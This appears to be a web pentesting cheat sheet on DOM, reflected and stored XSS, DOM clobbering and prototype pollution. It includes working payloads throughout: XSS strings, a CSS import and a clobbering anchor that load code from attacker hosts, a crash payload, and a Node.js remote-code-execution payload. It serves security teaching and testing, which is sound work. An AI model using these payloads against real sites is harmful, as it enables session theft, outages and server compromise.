Before diving in, it's important to understand the **taint flow** model that underpins most client-side JavaScript vulnerabilities:

- **Sources** are places where data enters the page under attacker/user control.
- **Sinks** are functions or properties that can cause a harmful effect (code execution, DOM manipulation, navigation) when attacker-controlled data reaches them.

A vulnerability exists when tainted data flows from a source to a sink **without being sanitized, encoded, or validated** along the way.

Common sources:

```
document.URL
document.documentURI
document.URLUnencoded
document.baseURI
location / location.hash / location.search
document.cookie
document.referrer
window.name
history.pushState / history.replaceState
postMessage data (message event)
localStorage / sessionStorage
```

## DOM XSS

DOM XSS is a type of Cross-Site Scripting where the vulnerability exists entirely in client-side code: the page takes attacker-controlled data from a **source** and passes it to a **sink** that supports dynamic code execution or HTML rendering — the server never even sees the malicious payload, which makes DOM XSS invisible to server-side logs/WAFs that only inspect requests.

Common DOM XSS sinks:

```
document.write()
document.writeln()
document.domain
element.innerHTML
element.outerHTML
element.insertAdjacentHTML()
element.onevent (e.g. onclick = untrustedInput)
eval()
setTimeout() / setInterval() (when passed a string)
Function() constructor
element.src / element.href (javascript: URIs)
jQuery: $(), .html(), .append()
```

Testing methodology: trace each source above through the page's JavaScript (browser DevTools → search for the source string, or use a proxy-based tool like Burp's DOM Invader) to see if it reaches any of the sinks above unmodified.

## Reflected XSS

Reflected XSS occurs when the application takes unsafe input (typically a query parameter or search field) and reflects it back **immediately** in the response, without persisting it server-side. Requires tricking the victim into clicking a crafted link.

Below are common XSS contexts and representative payloads for each:

### XSS between HTML tags

```html
<script>alert(document.domain)</script>
<img src=x onerror=alert(document.domain)>
<svg onload=alert(document.domain)>
<body onload=alert(document.domain)>
```

### XSS in HTML tag attributes

```html
"><script>alert(document.domain)</script>
" autofocus onfocus=alert(document.domain) x="
"><img src=x onerror=alert(document.domain)>
javascript:alert(document.domain)   <!-- for href/src attributes -->
```

### XSS inside a JavaScript context

```html
</script><script>alert(document.domain)</script>
';alert(document.domain)//
`;alert(document.domain);//`
```

### XSS in CSS/style contexts

```html
"><style>@import 'https://attacker.com/evil.css';</style>
expression(alert(document.domain))  <!-- legacy IE only -->
```

Always test payload variants around **filter evasion**: case variation (`<ScRiPt>`), encoding (HTML entities, URL encoding, Unicode), event handler variety (`onerror`, `onload`, `onfocus`, `onmouseover`), and alternative tags (`<svg>`, `<details open ontoggle=...>`, `<iframe srcdoc=...>`) if the obvious `<script>` tag gets filtered/CSP-blocked.

## Stored XSS

Stored (persistent) XSS uses the same payload set as reflected XSS, but the payload is saved server-side (e.g. in a comment, profile field, or message) and served back to **every user who views that content** — no need to trick each victim individually, which makes it substantially higher impact than reflected XSS for the same payload.

## DOM Clobbering

DOM Clobbering is a technique where an attacker injects HTML (without executing any JavaScript directly — useful when script tags/event handlers are filtered but arbitrary HTML injection is still possible) to manipulate the DOM and, through it, the page's own JavaScript logic. It typically abuses the browser behavior where elements with an `id` or `name` attribute are automatically exposed as **named properties on `window`** (or on their containing element), letting an attacker overwrite what a script *expects* to be a safe global variable or `undefined`.

Common vulnerable pattern in application code:

```javascript
let exampleVariable = window.exampleVariable || {};
// or
if (!config) { config = defaultConfig; }
```

If the attacker can get `window.exampleVariable` to resolve to a DOM element (or a collection) instead of being `undefined`, the `||` fallback never triggers and the "safe default" is silently bypassed.

Basic clobbering payload:

```html
<a id=exampleVariable><a id=exampleVariable name=url href=//attacker-website/malicious.js>
```

The two anchors with the same `id` clobber `window.exampleVariable` into an `HTMLCollection`; accessing `.url` on that collection resolves to the `href` of the second, named anchor — often enough to redirect a dynamically-loaded `<script src>` to an attacker-controlled file.

Other useful clobbering primitives:

```html
<form id=x><input id=y name=action></form>  <!-- clobbers document.x.y -->
<img name=x>                                 <!-- clobbers window.x -->
```

DOM Clobbering is frequently used as a **CSP bypass / gadget chain starting point** in combination with Prototype Pollution (see below), especially when the CSP blocks inline scripts but the page loads a script whose `src` is built from a clobberable variable.

## Prototype Pollution

Prototype Pollution is a security vulnerability that allows an attacker to inject properties into JavaScript's global `Object.prototype`, affecting **every object** in the application that inherits from it (which, by default, is virtually all of them).

**Prototype** is JavaScript's mechanism for objects to link to each other and inherit properties/methods. Every object has its own prototype, and since a prototype is itself an object, it too has a prototype — forming a chain that terminates when a prototype resolves to `null` (the prototype of `Object.prototype` itself).

You can access an object's prototype via the `__proto__` accessor or `Object.getPrototypeOf()`.

Example object:

```javascript
const user = {
    "name": "Bob",
    "age": 23
};
```

Its prototype chain:

```javascript
user.__proto__               // Object.prototype
user.name.__proto__          // String.prototype
user.name.__proto__.__proto__       // Object.prototype
user.name.__proto__.__proto__.__proto__  // null
```

If an attacker can write to `Object.prototype` (e.g. via `__proto__`, or in older engines `constructor.prototype`), every object in the application inherits the polluted property — including objects the application never intended to be attacker-influenced at all.

### Sources

Common places tainted data enters a prototype-pollution-vulnerable merge/clone/parse function:

- URL (query string or hash fragment)
- JSON request bodies
- Any recursive "merge," "extend," "clone," or "setNestedProperty" utility operating on user-controlled objects (common in older versions of `lodash`, `jQuery.extend`, `Hoek`, and hand-rolled deep-merge helpers)

### Sinks

Prototype Pollution sinks largely overlap with [[#DOM XSS]] sinks — any sink that reads a property which *could* be inherited from a polluted `Object.prototype` rather than being explicitly set on the object itself.

### Gadgets

A "gadget" is existing application code that turns a raw prototype pollution primitive into concrete impact. Look for:

- Properties/methods read from an object and passed to a sink **without an explicit `hasOwnProperty` check** (so a polluted inherited property is used as if it were legitimately set).
- Properties/methods **not directly defined** on the object in question, but silently inherited — these are exactly what pollution can forge.
- Common real-world gadgets: `options.timeout`, template-engine settings objects, `child_process` option objects (`shell`, `execArgv`), and any object passed wholesale into `innerHTML`/`eval`-adjacent sinks.

### Confirming

Try injecting an arbitrary property via the query string:

```
https://vulnerable-website.com/?__proto__[x]=y
```

Then, in the browser DevTools console, check:

```javascript
Object.prototype.x
```

- If it returns `y`, you've successfully polluted the global prototype.
- If it returns `undefined`, the attempt failed (the app may sanitize `__proto__`/`constructor`/`prototype` keys, or the merge function may not be vulnerable).

For JSON-consuming endpoints/forms, use the same approach with a JSON body:

```json
{"__proto__": {"x": "y"}}
```

...then check whether `x` gets reflected anywhere observable (response body, subsequent GET, DevTools if it's a client-side merge).

### Exploitation

Prototype Pollution alone rarely has direct impact — its severity comes almost entirely from **what it's chained with**.

#### XSS via Prototype Pollution

Once PP is confirmed, try polluting a property that a known gadget later feeds into an HTML/JS sink:

```
https://vulnerable-website.com/?__proto__[x]=data:,alert(document.domain);
```

(The exact property name to pollute depends on the specific gadget present in the target's client-side code — this requires source review or trial-and-error against known frameworks.)

#### DoS via Prototype Pollution

> [!warning]
> This technique is very dangerous to test against production environments. Do not test this against live targets in bug bounty/pentest engagements without explicit, written authorization to test denial-of-service conditions — it will very likely crash or degrade the application for real users. It's included here purely to illustrate the risk.

```json
{"__proto__": {"toString": "Crashed!"}}
```

Because `toString()` is implicitly invoked in countless contexts (string concatenation, template literals, logging, JSON serialization fallbacks), overwriting it with a non-function value causes any subsequent implicit call to throw, potentially crashing the process or request handler.

#### RCE via Prototype Pollution

Server-side (Node.js) RCE is possible when pollution reaches configuration objects consumed by dangerous APIs. Example payload targeting `child_process` execution options:

```json
{"__proto__": {"execArgv": ["--eval=require('child_process').execSync('<your-command-here>')"]}}
```

This works because certain Node.js child-process spawning paths read `execArgv` from an options object without validating that it was explicitly (not inherited) set — this is highly implementation-specific and requires the target to actually spawn a Node subprocess somewhere in a vulnerable manner.

### Preventing Prototype Pollution

1. Use `Object.create(null)` for objects that don't need to inherit from `Object.prototype`.
2. Use `Map` instead of plain objects for user-controlled key/value data.
3. Freeze the prototype in defense-in-depth fashion: `Object.freeze(Object.prototype)`.
4. In merge/clone utilities, explicitly block `__proto__`, `constructor`, and `prototype` as keys, and prefer `Object.hasOwn()` checks before assignment.
5. Keep dependencies (lodash, jQuery, etc.) patched — many historical PP gadgets were fixed upstream.
